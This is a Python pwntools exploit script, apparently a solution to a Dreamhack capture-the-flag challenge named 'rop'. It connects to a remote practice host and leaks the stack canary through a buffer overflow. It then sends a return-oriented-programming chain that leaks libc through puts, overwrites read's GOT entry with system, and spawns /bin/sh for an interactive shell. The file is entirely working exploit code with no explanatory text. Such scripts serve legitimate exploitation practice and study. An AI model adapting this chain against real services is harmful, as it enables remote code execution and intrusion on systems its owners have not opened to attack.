from pwn import*
context.arch='amd64'
context.log_level = 'debug'

host = 'host3.dreamhack.games'
port = 20922

r = remote(host, port)

elf = ELF('./rop')
libc = ELF('./libc-2.27.so')

pop_rdi = 0x4007f3
pop_rsi_r15 = 0x4007f1
read_plt = 0x4005a0
read_got = 0x601030
puts_plt = 0x400570 


leak_canary = ''
leak_canary += b'A'*(0x40 - 0x8)
leak_canary += b'B'

r.sendafter('Buf: ', leak_canary)
r.recvuntil(leak_canary)

canary = r.recvn(7)
canary = u64(b'\x00' + canary)

log.info('[+] canary : '+hex(canary))
pause()

payload = ''
payload += b'A' * (0x40 - 0x8)
payload += p64(canary)
payload += b'B' * 0x8

# puts(read_got)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)

# read(0, read_got, 0x10)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# read('/bin/sh') == system('/bin/sh')
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

r.sendafter('Buf: ', payload)

read = u64(r.recvn(6) + b'\x00\x00')
libc_base = read - libc.symbols['read']
system = libc.symbols['system'] + libc_base

log.info('[+] read : '+hex(read))
log.info('[+] libc_base : '+ hex(libc_base))
log.info('[+] system : '+hex(system))

pause()

# system('/bin/sh')
r.send(p64(system) + b'/bin/sh\x00')
r.interactive()
